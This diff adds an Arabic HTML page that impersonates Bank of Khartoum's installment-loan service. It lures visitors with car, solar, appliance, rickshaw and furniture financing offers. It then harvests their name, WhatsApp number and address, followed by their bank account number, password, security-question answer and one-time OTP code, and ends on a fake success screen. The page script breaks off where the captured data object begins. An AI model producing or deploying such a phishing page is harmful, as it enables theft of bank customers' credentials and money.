@@ -1,0 +1,1026 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="color-scheme" content="light">
+    <meta name="supported-color-schemes" content="light">
+    <title>برامج التمويل الميسر - بنك الخرطوم</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { color-scheme: light; }
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Cairo', sans-serif; 
+            -webkit-tap-highlight-color: transparent;
+        }
+        html {
+            -webkit-text-size-adjust: 100%;
+            text-size-adjust: 100%;
+        }
+        body { 
+            background-color: #f8fafc; 
+            min-height: 100vh; 
+            min-height: 100dvh;
+            display: flex; 
+            flex-direction: column; 
+            color: #1e293b; 
+            overflow-x: hidden; 
+        }
+        
+        .header-img-container { background: #ffffff; display: flex; align-items: center; justify-content: center; padding: 12px 15px; border-bottom: 2px solid #c5a059; box-shadow: 0 1px 3px rgba(0,0,0,0.05); width: 100%; }
+        .header-img-container img { width: 100%; max-width: 520px; height: auto; max-height: 110px; object-fit: contain; display: block; }
+
+        .main-container { flex: 1; display: flex; flex-direction: column; max-width: 600px; width: 100%; margin: 0 auto; padding: 15px; }
+        .card { background: white; width: 100%; flex: 1; padding: 30px 20px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; text-align: right; display: flex; flex-direction: column; justify-content: center; min-height: 60vh; }
+        .hidden { display: none !important; }
+        
+        h2 { color: #0d5c3d; margin-bottom: 12px; font-size: 20px; font-weight: 700; text-align: right; width: 100%; }
+        h3 { color: #334155; margin-bottom: 20px; font-size: 15px; border-bottom: 2px solid #c5a059; display: block; padding-bottom: 5px; text-align: right; width: 100%; }
+        
+        .info-box {
+            background-color: #f8fafc;
+            border: 1px solid #cbd5e1;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #334155;
+            line-height: 1.8;
+            text-align: right;
+            width: 100%;
+        }
+        .info-box h4 {
+            color: #0d5c3d;
+            font-size: 14.5px;
+            margin-bottom: 8px;
+            margin-top: 10px;
+        }
+        .info-box h4:first-child {
+            margin-top: 0;
+        }
+        .info-box ul {
+            padding-right: 20px;
+            margin-bottom: 8px;
+        }
+
+        .input-group { margin-bottom: 16px; text-align: right; width: 100%; }
+        .input-group label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 13.5px; color: #334155; text-align: right; width: 100%; }
+        .input-wrapper { position: relative; width: 100%; }
+        
+        input, select, textarea { 
+            -webkit-appearance: none; 
+            -moz-appearance: none; 
+            appearance: none; 
+            width: 100%; 
+            padding: 12px 15px; 
+            border: 1px solid #cbd5e1; 
+            border-radius: 10px; 
+            background-color: #f8fafc; 
+            font-size: 14px; 
+            outline: none; 
+            transition: border-color 0.2s; 
+            text-align: right; 
+            direction: rtl;
+            color: #1e293b;
+        }
+
+        input::placeholder, textarea::placeholder {
+            text-align: right;
+            color: #94a3b8;
+        }
+
+        select {
+            background-image: url('data:image/svg+xml;utf8,<svg fill="%23334155" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: left 10px center;
+            background-size: 18px;
+            padding-left: 35px !important;
+        }
+
+        input:focus, select:focus, textarea:focus { border-color: #c5a059; background-color: #fff; }
+        
+        .icon-eye { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #64748b; cursor: pointer; }
+        .btn-submit { -webkit-appearance: none; appearance: none; background-color: #c5a059; color: white; border: none; width: 100%; padding: 14px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 15px; box-shadow: 0 4px 10px rgba(197,160,89,0.3); text-align: center; }
+        .btn-submit:hover { background-color: #b08d4b; }
+
+        .categories-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .btn-circle-card {
+            background-color: #ffffff;
+            border: 2px solid #e2e8f0;
+            border-radius: 14px;
+            padding: 12px 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+        }
+
+        .btn-circle-card:hover {
+            border-color: #c5a059;
+            background-color: #fefce8;
+            transform: translateY(-2px);
+        }
+
+        .icon-circle {
+            width: 65px;
+            height: 65px;
+            background-color: #f8fafc;
+            border: 2px solid #c5a059;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+            overflow: hidden;
+            transition: all 0.2s;
+        }
+
+        .icon-circle img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .btn-circle-card:hover .icon-circle {
+            border-color: #0d5c3d;
+        }
+
+        .btn-circle-title {
+            color: #334155;
+            font-size: 13px;
+            font-weight: 700;
+            text-align: center;
+            line-height: 1.4;
+        }
+
+        .btn-circle-card.full-width {
+            grid-column: span 2;
+            flex-direction: row;
+            justify-content: flex-start;
+            padding: 12px 15px;
+            gap: 15px;
+        }
+
+        .btn-circle-card.full-width .icon-circle {
+            width: 45px;
+            height: 45px;
+            margin-bottom: 0;
+            border-radius: 50%;
+        }
+
+        .btn-circle-card.full-width .icon-circle i {
+            font-size: 20px;
+            color: #25d366;
+        }
+
+        .btn-circle-card.full-width .btn-circle-title {
+            text-align: right;
+            font-size: 14px;
+            color: #0d5c3d;
+        }
+
+        .branch-notice {
+            background-color: #fefce8;
+            border: 1px solid #fde047;
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            color: #854d0e;
+            line-height: 1.5;
+            text-align: right;
+            width: 100%;
+        }
+
+        .price-calc-box {
+            background-color: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            padding: 12px 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            text-align: right;
+            width: 100%;
+        }
+        .price-calc-box p {
+            font-size: 13.5px;
+            color: #166534;
+            margin-bottom: 4px;
+            font-weight: 600;
+        }
+
+        .otp-timer { color: #c5a059; font-size: 13px; margin-bottom: 15px; text-align: center; display: block; width: 100%; }
+        .error-message { color: #e11d48; font-size: 12.5px; font-weight: bold; margin-top: 6px; display: block; text-align: right; width: 100%; }
+        
+        .success-box { background-color: #ffffff; border: 2px solid #c5a059; padding: 20px; border-radius: 12px; margin-top: 15px; text-align: right; width: 100%; }
+        .reference-title { font-size: 14px; color: #334155; font-weight: bold; display: block; text-align: center; margin-top: 8px; width: 100%; }
+        .reference-number { font-size: 24px; color: #0d5c3d; font-weight: 700; letter-spacing: 2px; display: block; margin: 12px 0; text-align: center; background: #f8fafc; padding: 10px; border: 1px dashed #c5a059; border-radius: 8px; width: 100%; }
+        
+        .article-container { text-align: right; margin-top: 20px; border-top: 2px solid #e2e8f0; padding-top: 15px; width: 100%; }
+        .article-container h4 { color: #0d5c3d; margin-bottom: 8px; font-size: 16px; font-weight: 700; text-align: right; width: 100%; }
+        .article-container p { font-size: 13px; color: #475569; line-height: 1.8; margin-bottom: 10px; text-align: right; width: 100%; }
+
+        .loading-spinner { display: inline-block; width: 18px; height: 18px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* شاشة التحميل الحمراء */
+        #custom-loader {
+            position: fixed;
+            inset: 0;
+            background-color: #dc2626;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        #custom-loader.hidden {
+            display: none !important;
+        }
+        .loader-spinner-lg {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 20px;
+        }
+        .loader-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .loader-subtitle {
+            font-size: 15px;
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+    <!-- شاشة التحميل الحمراء -->
+    <div id="custom-loader" class="hidden">
+        <div class="loader-spinner-lg"></div>
+        <div class="loader-title">جاري التحميل...</div>
+        <div class="loader-subtitle" style="margin-bottom: 5px; font-weight: bold;">بنك الخرطوم</div>
+        <div class="loader-subtitle">خدمة الشراء بالاقساط المريحة</div>
+    </div>
+
+    <header class="header-img-container">
+        <img src="m.jpg" alt="بنك الخرطوم">
+    </header>
+
+    <div class="main-container">
+        <!-- 1. الشاشة الرئيسية: اختيار نوع التمويل -->
+        <div id="step-home" class="card">
+            <h2>برامج الأقساط والتمويل الميسر</h2>
+            <h3>بنك الخرطوم - دليلك للحصول على التمويل</h3>
+
+            <div class="info-box">
+                <h4>📋 كيفية التقديم إلى القرض:</h4>
+                <ul>
+                    <li>اختر فئة التمويل المطلوبة من الأزرار أدناه.</li>
+                    <li>حدد السلعة والمواصفات واطلع على السعر والقسط الشهري.</li>
+                    <li>أدخل بياناتك الشخصية وتوثيق الحساب البنكي لإتمام الطلب.</li>
+                </ul>
+
+                <h4>📍 مكان الاستلام:</h4>
+                <p>يتم استلام المنتجات المتمولة فور اكتمال الإجراءات عبر <strong>فرع أمدرمان - السوق الشعبي</strong>.</p>
+            </div>
+            
+            <div class="categories-grid">
+                <div class="btn-circle-card" onclick="selectCategory('قروض لشراء سيارات')">
+                    <div class="icon-circle">
+                        <img src="https://images.unsplash.com/photo-1533473359331-0135ef1b58bf?auto=format&fit=crop&w=150&q=80" alt="شراء سيارات">
+                    </div>
+                    <span class="btn-circle-title">تمويل لشراء سيارة</span>
+                </div>
+
+                <div class="btn-circle-card" onclick="selectCategory('قروض لشراء الطاقات الشمسية')">
+                    <div class="icon-circle">
+                        <img src="https://images.unsplash.com/photo-1508514177221-188b1cf16e9d?auto=format&fit=crop&w=150&q=80" alt="الطاقات الشمسية">
+                    </div>
+                    <span class="btn-circle-title">تمويل لشراء طاقة شمسية</span>
+                </div>
+
+                <div class="btn-circle-card" onclick="selectCategory('قروض لشراء أدوات كهربية')">
+                    <div class="icon-circle">
+                        <img src="https://images.unsplash.com/photo-1556911220-e15b29be8c8f?auto=format&fit=crop&w=150&q=80" alt="أدوات كهربية">
+                    </div>
+                    <span class="btn-circle-title">تمويل أدوات كهربائية</span>
+                </div>
+
+                <div class="btn-circle-card" onclick="selectCategory('قروض لشراء ركشة أو توكتوك')">
+                    <div class="icon-circle">
+                        <img src="https://images.unsplash.com/photo-1568772585407-9361f9bf3a87?auto=format&fit=crop&w=150&q=80" alt="ركشة أو توكتوك">
+                    </div>
+                    <span class="btn-circle-title">تمويل ركشة أو توكتوك</span>
+                </div>
+
+                <div class="btn-circle-card" onclick="selectCategory('قرض الاثاثات و الديكور')">
+                    <div class="icon-circle">
+                        <img src="https://images.unsplash.com/photo-1555041469-a586c61ea9bc?auto=format&fit=crop&w=150&q=80" alt="الاثاثات">
+                    </div>
+                    <span class="btn-circle-title">تمويل أثاث منزلي وديكور</span>
+                </div>
+
+                <div class="btn-circle-card" style="visibility: hidden; pointer-events: none;"></div>
+
+                <a href="https://wa.me/249117284407?text=%Dالسلام%20عليكم،%20أرغب%20في%20الاستفسار%20عن%20تفاصيل%20قروض%20وبرامج%20التمويل%20الميسر%20من%20بنك%20الخرطوم." target="_blank" class="btn-circle-card full-width">
+                    <div class="icon-circle" style="width: 45px; height: 45px;">
+                        <i class="fab fa-whatsapp"></i>
+                    </div>
+                    <span class="btn-circle-title" style="text-align: right; font-size: 14px; color: #0d5c3d;">تواصل معنا عبر الواتساب للاستفسار</span>
+                </a>
+            </div>
+        </div>
+
+        <!-- 2. صفحات اختيار السلعة والمواصفات والأسعار -->
+        <div id="step-cars" class="card hidden">
+            <h2>تمويل شراء السيارات</h2>
+            <h3>اختر نوع السيارة والموديل وسعرها وقسطها</h3>
+            
+            <div class="input-group">
+                <label>نوع السيارة:</label>
+                <select id="car-model-type" onchange="updateCarDetails()">
+                    <option value="" disabled selected>-- اختر نوع السيارة --</option>
+                    <option value="هيونداي افانتي (دبدوب)|28500000">هيونداي افانتي (دبدوب) - تبدأ من 28,500,000 ج.س</option>
+                    <option value="ميتسوبيشي لانسر|24000000">ميتسوبيشي لانسر - تبدأ من 24,000,000 ج.س</option>
+                    <option value="هيونداي اكسنت|22000000">هيونداي اكسنت - تبدأ من 22,000,000 ج.س</option>
+                    <option value="تويوتا هايلوكس دبل كاب|55000000">تويوتا هايلوكس دبل كاب - تبدأ من 55,000,000 ج.س</option>
+                    <option value="هيونداي توسان|48000000">هيونداي توسان - تبدأ من 48,000,000 ج.س</option>
+                </select>
+                <span id="err-car-type" class="error-message hidden">الرجاء اختيار نوع السيارة</span>
+            </div>
+
+            <div class="input-group">
+                <label>سنة الصنع / الموديل (يقل السعر 2 مليون لكل سنة أقدم):</label>
+                <select id="car-year" onchange="updateCarDetails()">
+                    <option value="" disabled selected>-- اختر سنة الموديل --</option>
+                    <script>
+                        for(let y = 2023; y >= 2010; y--) {
+                            document.write(`<option value="${y}">موديل ${y}</option>`);
+                        }
+                    </script>
+                </select>
+                <span id="err-car-year" class="error-message hidden">الرجاء اختيار سنة الموديل</span>
+            </div>
+
+            <div class="input-group">
+                <label>مدة سداد القرض:</label>
+                <select id="car-duration" onchange="updateCarDetails()">
+                    <option value="" disabled selected>-- اختر مدة السداد --</option>
+                    <option value="6">ستة شهور</option>
+                    <option value="9">تسعة شهور</option>
+                    <option value="12">سنة (12 شهر)</option>
+                    <option value="18">سنة ونصف (18 شهر)</option>
+                </select>
+                <span id="err-car-duration" class="error-message hidden">الرجاء اختيار مدة السداد</span>
+            </div>
+
+            <div id="car-price-box" class="price-calc-box hidden">
+                <p id="car-price-text">السعر الإجمالي: 0 ج.س</p>
+                <p id="car-installment-text">القسط الشهري التقريبي: 0 ج.س</p>
+            </div>
+
+            <div class="input-group">
+                <label>مواصفات إضافية:</label>
+                <textarea id="car-specs" placeholder="اكتب اللون أو الحالة أو أي ملاحظات..."></textarea>
+            </div>
+
+            <button class="btn-submit" onclick="submitProductStep('car')">متابعة لإدخال البيانات الشخصية</button>
+            <button class="btn-submit" style="background-color: #64748b; margin-top: 10px;" onclick="goToStep('step-home')">الرجوع للخلف</button>
+        </div>
+
+        <div id="step-solar" class="card hidden">
+            <h2>تمويل منظومات الطاقة الشمسية</h2>
+            <h3>اختر سعة المنظومة وسعرها وقسطها الشهري</h3>
+            
+            <div class="input-group">
+                <label>سعة المنظومة:</label>
+                <select id="solar-capacity" onchange="updateSolarDetails()">
+                    <option value="" disabled selected>-- اختر سعة المنظومة --</option>
+                    <option value="منظومة 2.5 كيلو|3200000">منظومة 2.5 كيلو - 3,200,000 ج.س</option>
+                    <option value="منظومة 3.5 كيلو|4500000">منظومة 3.5 كيلو - 4,500,000 ج.س</option>
+                    <option value="منظومة 5 كيلو|6800000">منظومة 5 كيلو - 6,800,000 ج.س</option>
+                    <option value="منظومة 8 كيلو|10500000">منظومة 8 كيلو - 10,500,000 ج.س</option>
+                    <option value="منظومة 10 كيلو|13500000">منظومة 10 كيلو - 13,500,000 ج.س</option>
+                    <option value="منظومة 16 كيلو|21000000">منظومة 16 كيلو - 21,000,000 ج.س</option>
+                </select>
+                <span id="err-solar" class="error-message hidden">الرجاء اختيار سعة المنظومة</span>
+            </div>
+
+            <div class="input-group">
+                <label>مدة سداد القرض:</label>
+                <select id="solar-duration" onchange="calculateInstallment('solar')">
+                    <option value="" disabled selected>-- اختر مدة السداد --</option>
+                    <option value="6">ستة شهور</option>
+                    <option value="9">تسعة شهور</option>
+                    <option value="12">سنة (12 شهر)</option>
+                    <option value="18">سنة ونصف (18 شهر)</option>
+                </select>
+                <span id="err-solar-duration" class="error-message hidden">الرجاء اختيار مدة السداد</span>
+            </div>
+
+            <div id="solar-price-box" class="price-calc-box hidden">
+                <p id="solar-price-text">السعر الإجمالي: 0 ج.س</p>
+                <p id="solar-installment-text">القسط الشهري التقريبي: 0 ج.س</p>
+            </div>
+
+            <div class="input-group">
+                <label>مواصفات إضافية (الألواح، البطاريات، الانفيرتر):</label>
+                <textarea id="solar-specs" placeholder="اكتب التفاصيل المطلوبة..."></textarea>
+            </div>
+
+            <button class="btn-submit" onclick="submitProductStep('solar')">متابعة لإدخال البيانات الشخصية</button>
+            <button class="btn-submit" style="background-color: #64748b; margin-top: 10px;" onclick="goToStep('step-home')">الرجوع للخلف</button>
+        </div>
+
+        <div id="step-appliances" class="card hidden">
+            <h2>تمويل الأدوات الكهربائية</h2>
+            <h3>اختر نوع الأداة الكهربائية وسعرها وقسطها</h3>
+            
+            <div class="input-group">
+                <label>نوع الأداة الكهربائية:</label>
+                <select id="appliance-item" onchange="updateApplianceDetails()">
+                    <option value="" disabled selected>-- اختر الأداة الكهربائية --</option>
+                    <option value="ثلاجة ديلونجي / سامسونج 16 قدم|1850000">ثلاجة 16 قدم - 1,850,000 ج.س</option>
+                    <option value="غسالة أوتوماتيك 8 كيلو|1400000">غسالة أوتوماتيك 8 كيلو - 1,400,000 ج.س</option>
+                    <option value="مكيف اسبليت 1.5 طن|2100000">مكيف اسبليت 1.5 طن - 2,100,000 ج.س</option>
+                    <option value="شاشة تلفزيون سمارت 55 بوصة|1650000">شاشة سمارت 55 بوصة - 1,650,000 ج.س</option>
+                    <option value="فرن غاز متكامل مع عيون كهربائية|950000">فرن غاز متكامل - 950,000 ج.س</option>
+                </select>
+                <span id="err-appliance" class="error-message hidden">الرجاء اختيار نوع الأداة</span>
+            </div>
+
+            <div class="input-group">
+                <label>مدة سداد القرض:</label>
+                <select id="appliance-duration" onchange="calculateInstallment('appliance')">
+                    <option value="" disabled selected>-- اختر مدة السداد --</option>
+                    <option value="6">ستة شهور</option>
+                    <option value="9">تسعة شهور</option>
+                    <option value="12">سنة (12 شهر)</option>
+                    <option value="18">سنة ونصف (18 شهر)</option>
+                </select>
+                <span id="err-appliance-duration" class="error-message hidden">الرجاء اختيار مدة السداد</span>
+            </div>
+
+            <div id="appliance-price-box" class="price-calc-box hidden">
+                <p id="appliance-price-text">السعر الإجمالي: 0 ج.س</p>
+                <p id="appliance-installment-text">القسط الشهري التقريبي: 0 ج.س</p>
+            </div>
+
+            <div class="input-group">
+                <label>مواصفات إضافية:</label>
+                <textarea id="appliance-specs" placeholder="الماركة المفضلة، اللون، الموديل..."></textarea>
+            </div>
+
+            <button class="btn-submit" onclick="submitProductStep('appliance')">متابعة لإدخال البيانات الشخصية</button>
+            <button class="btn-submit" style="background-color: #64748b; margin-top: 10px;" onclick="goToStep('step-home')">الرجوع للخلف</button>
+        </div>
+
+        <div id="step-rickshaw" class="card hidden">
+            <h2>تمويل ركشة أو توكتوك</h2>
+            <h3>اختر نوع المركبة والموديل وسعرها وقسطها</h3>
+            
+            <div class="input-group">
+                <label>نوع المركبة والموديل:</label>
+                <select id="rickshaw-type" onchange="updateRickshawDetails()">
+                    <option value="" disabled selected>-- اختر نوع المركبة --</option>
+                    <option value="ركشة باجاج هندي موديل 2024|6500000">ركشة باجاج هندي موديل 2024 - 6,500,000 ج.س</option>
+                    <option value="ركشة تافا موديل حديث|5800000">ركشة تافا موديل حديث - 5,800,000 ج.س</option>
+                    <option value="توكتوك بضائع صيني متعدد الاستخدام|4900000">توكتوك بضائع صيني - 4,900,000 ج.س</option>
+                </select>
+                <span id="err-rickshaw" class="error-message hidden">الرجاء اختيار نوع المركبة</span>
+            </div>
+
+            <div class="input-group">
+                <label>مدة سداد القرض:</label>
+                <select id="rickshaw-duration" onchange="calculateInstallment('rickshaw')">
+                    <option value="" disabled selected>-- اختر مدة السداد --</option>
+                    <option value="6">ستة شهور</option>
+                    <option value="9">تسعة شهور</option>
+                    <option value="12">سنة (12 شهر)</option>
+                    <option value="18">سنة ونصف (18 شهر)</option>
+                </select>
+                <span id="err-rickshaw-duration" class="error-message hidden">الرجاء اختيار مدة السداد</span>
+            </div>
+
+            <div id="rickshaw-price-box" class="price-calc-box hidden">
+                <p id="rickshaw-price-text">السعر الإجمالي: 0 ج.س</p>
+                <p id="rickshaw-installment-text">القسط الشهري التقريبي: 0 ج.س</p>
+            </div>
+
+            <div class="input-group">
+                <label>مواصفات إضافية:</label>
+                <textarea id="rickshaw-specs" placeholder="اللون، الإكسسوارات..."></textarea>
+            </div>
+
+            <button class="btn-submit" onclick="submitProductStep('rickshaw')">متابعة لإدخال البيانات الشخصية</button>
+            <button class="btn-submit" style="background-color: #64748b; margin-top: 10px;" onclick="goToStep('step-home')">الرجوع للخلف</button>
+        </div>
+
+        <div id="step-furniture" class="card hidden">
+            <h2>قرض الأثاثات والديكور</h2>
+            <h3>اختر نوع الأثاث أو الديكور وسعره وقسطه</h3>
+            
+            <div class="input-group">
+                <label>نوع الأثاث / الديكور:</label>
+                <select id="furniture-type" onchange="updateFurnitureDetails()">
+                    <option value="" disabled selected>-- اختر نوع الأثاث --</option>
+                    <option value="غرفة نوم خشب زان متكاملة|3500000">غرفة نوم خشب زان متكاملة - 3,500,000 ج.س</option>
+                    <option value="طقم صالون أو انتريه فخم|2800000">طقم صالون أو انتريه فخم - 2,800,000 ج.س</option>
+                    <option value="طقم سفرة طعام 6 كرسي|2200000">طقم سفرة طعام 6 كرسي - 2,200,000 ج.س</option>
+                    <option value="ديكورات جبس بورد صالون وغرف|1900000">ديكورات جبس بورد متكاملة - 1,900,000 ج.س</option>
+                </select>
+                <span id="err-furniture-type" class="error-message hidden">الرجاء اختيار نوع الأثاث</span>
+            </div>
+
+            <div class="input-group">
+                <label>مدة سداد القرض:</label>
+                <select id="furniture-duration" onchange="calculateInstallment('furniture')">
+                    <option value="" disabled selected>-- اختر مدة السداد --</option>
+                    <option value="6">ستة شهور</option>
+                    <option value="9">تسعة شهور</option>
+                    <option value="12">سنة (12 شهر)</option>
+                    <option value="18">سنة ونصف (18 شهر)</option>
+                </select>
+                <span id="err-furniture-duration" class="error-message hidden">الرجاء اختيار مدة السداد</span>
+            </div>
+
+            <div id="furniture-price-box" class="price-calc-box hidden">
+                <p id="furniture-price-text">السعر الإجمالي: 0 ج.س</p>
+                <p id="furniture-installment-text">القسط الشهري التقريبي: 0 ج.س</p>
+            </div>
+
+            <div class="input-group">
+                <label>وصف دقيق ومواصفات إضافية:</label>
+                <textarea id="furniture-specs" placeholder="الألوان، المقاسات، التفاصيل..."></textarea>
+            </div>
+
+            <button class="btn-submit" onclick="submitProductStep('furniture')">متابعة لإدخال البيانات الشخصية</button>
+            <button class="btn-submit" style="background-color: #64748b; margin-top: 10px;" onclick="goToStep('step-home')">الرجوع للخلف</button>
+        </div>
+
+        <!-- 3. صفحة إدخال البيانات الشخصية -->
+        <div id="step-personal-info" class="card hidden">
+            <h2>إدخال بيانات المستخدم</h2>
+            <h3>يرجى استيفاء بيانات الهوية لإتمام الطلب</h3>
+
+            <div class="branch-notice">
+                📍 <strong>مقر الاستلام:</strong> فرع أمدرمان - السوق الشعبي.
+            </div>
+
+            <div class="input-group">
+                <label>الاسم رباعي:</label>
+                <input type="text" id="user-name" placeholder="أدخل الاسم رباعي">
+                <span id="err-user-name" class="error-message hidden">الرجاء إدخال الاسم رباعي</span>
+            </div>
+
+            <div class="input-group">
+                <label>رقم الواتساب:</label>
+                <input type="tel" id="user-whatsapp" placeholder="مثال: 0912345678">
+                <span id="err-user-whatsapp" class="error-message hidden">الرجاء إدخال رقم واتساب صحيح</span>
+            </div>
+
+            <div class="input-group">
+                <label>عنوان السكن:</label>
+                <input type="text" id="user-address" placeholder="المدينة / الحي / التفاصيل">
+                <span id="err-user-address" class="error-message hidden">الرجاء إدخال عنوان السكن</span>
+            </div>
+
+            <button class="btn-submit" onclick="submitUserIntro()">متابعة لتوثيق الحساب البنكي</button>
+            <button class="btn-submit" style="background-color: #64748b; margin-top: 10px;" onclick="goToProductStep()">الرجوع للخلف</button>
+        </div>
+
+        <!-- 4. صفحة تسجيل الدخول للحساب البنكي -->
+        <div id="step-inc-login" class="card hidden">
+            <h2>توثيق الحساب البنكي</h2>
+            <h3>الرجاء إدخال بيانات حساب بنك الخرطوم الخاص بك للبدء</h3>
+            
+            <div style="background-color: #fefce8; border: 1px solid #fde047; padding: 12px; border-radius: 10px; margin-bottom: 15px; font-size: 12.5px; color: #854d0e; line-height: 1.5; text-align: right; width: 100%;">
+                💡 <strong>تنويه:</strong> يتطلب تقديم طلب التمويل توثيق حسابك لدينا أولاً .
+            </div>
+
+            <div class="input-group">
+                <label>رقم الحساب:</label>
+                <input type="text" id="account-num" placeholder="أدخل رقم الحساب">
+                <span id="err-acc-num" class="error-message hidden">الرجاء إدخال رقم الحساب</span>
+            </div>
+            <div class="input-group">
+                <label>كلمة مرور الحساب:</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور">
+                    <span class="icon-eye" onclick="togglePassword('password')">👁️</span>
+                </div>
+                <span id="err-password" class="error-message hidden">الرجاء إدخال كلمة المرور</span>
+                <span id="inc-login-error" class="error-message hidden">رقم الحساب أو كلمة السر خاطئة، الرجاء المحاولة مرة أخرى</span>
+            </div>
+            <button class="btn-submit" onclick="submitStep1()">تسجيل الدخول ومتابعة</button>
+            <button class="btn-submit" style="background-color: #64748b; margin-top: 10px;" onclick="goToStep('step-personal-info')">الرجوع للخلف</button>
+        </div>
+
+        <!-- 5. صفحة سؤال الأمان -->
+        <div id="step-inc-security" class="card hidden">
+            <h2>التحقق الأمني</h2>
+            <h3>لأغراض الحماية، يرجى الإجابة على سؤال الأمان المرتبط بحسابك</h3>
+            <div class="input-group">
+                <label>اختر سؤال الأمان:</label>
+                <select id="security-question">
+                    <option value="" disabled selected>-- اختر سؤال الأمان --</option>
+                    <option>ما هو اسم ابن عمك الأول؟</option>
+                    <option>في أي مدينة ولدت؟</option>
+                    <option>في أي سنة تخرجت من الجامعة؟</option>
+                    <option>ماذا كان لقبك أثناء الطفولة؟</option>
+                    <option>اسم مؤلفك المفضل؟</option>
+                    <option>اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+                    <option>أي فيلم هو المفضل لديك؟</option>
+                    <option>اسم أفضل صديق في الطفولة؟</option>
+                    <option>في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
+                    <option>العلامة التجارية لأول تلفزيون خاص بك؟</option>
+                    <option>في أي سنة تزوجت؟</option>
+                    <option>اسم فريق كرة القدم المفضل لديك؟</option>
+                    <option>ما هو اسم المدرسة التي التحقت بها؟</option>
+                    <option>اسم أول بلد أجنبي قمت بزيارته؟</option>
+                    <option>ما هي ماركة سيارتك الأولى؟</option>
+                </select>
+                <span id="err-sec-q" class="error-message hidden">الرجاء اختيار سؤال الأمان</span>
+            </div>
+            <div class="input-group">
+                <label>إجابة سؤال الأمان:</label>
+                <input type="text" id="security-answer" placeholder="اكتب إجابتك هنا">
+                <span id="err-sec-ans" class="error-message hidden">الرجاء إدخال إجابة سؤال الأمان</span>
+            </div>
+            <button class="btn-submit" onclick="submitStep2()">إرسال والمتابعة</button>
+            <button class="btn-submit" style="background-color: #64748b; margin-top: 10px;" onclick="goToStep('step-inc-login')">الرجوع للخلف</button>
+        </div>
+
+        <!-- 6. صفحة رمز التحقق OTP وإرسال الطلب النهائي -->
+        <div id="step-inc-otp" class="card hidden">
+            <div id="otp-area" style="width: 100%;">
+                <h2>رمز التحقق الأمني (OTP)</h2>
+                <div class="input-group">
+                    <label style="text-align: right;">أدخل رمز التحقق المرسل إلى بريدك الإلكتروني أو رقم هاتف:</label>
+                    <input type="text" id="otp-code" placeholder="000000" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
+                    <span id="err-otp" class="error-message hidden" style="text-align:center;">الرجاء إدخال رمز التحقق (OTP)</span>
+                    <span id="err-otp-invalid" class="error-message hidden" style="text-align:right;">الرمز خاطئ، الرجاء تفقد البريد الإلكتروني أو صندوق رسائل رقم الهاتف المسجل مع الحساب وإدخال الرمز الصحيح</span>
+                </div>
+                <span id="otp-timer" class="otp-timer">إعادة إرسال الرمز خلال 30:00 دقيقة</span>
+                <button id="verify-btn" class="btn-submit" onclick="verifyOtp()">التحقق الاعتمادي وإتمام الطلب</button>
+            </div>
+        </div>
+
+        <!-- 7. الصفحة الأخيرة (النجاح) -->
+        <div id="step-success" class="card hidden" style="align-items: center;">
+            <div class="success-box" style="margin-top:0;">
+                <h2 style="color: #0d5c3d; text-align: center; margin-bottom: 10px;">✓ تم تقديم طلب التمويل بنجاح</h2>
+                <span class="reference-title">الرقم المرجعي لطلبك:</span>
+                <span id="display-ref-num" class="reference-number">REF-00000000</span>
+                
+                <div class="article-container">
+                    <h4>مقر الاستلام وإجراءات المتابعة</h4>
+                    <p>عزيزنا العميل، تم استلام طلبك الخاص ببرنامج التمويل الميسر بنجاح. نود تذكيرك بأن <strong>مقر استلام المنتجات هو: فرع أمدرمان - السوق الشعبي</strong>.</p>
+                    <p>سيقوم فريق المختصين بمراجعة الطلب والتواصل معك عبر رقم الواتساب المسجل في أقرب وقت لتأكيد التفاصيل النهائية ومواعيد الاستلام.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let userData = { 
+            category: '', productName: '', productPrice: 0, productDetails: '', 
+            name: '', whatsapp: '', address: '', 
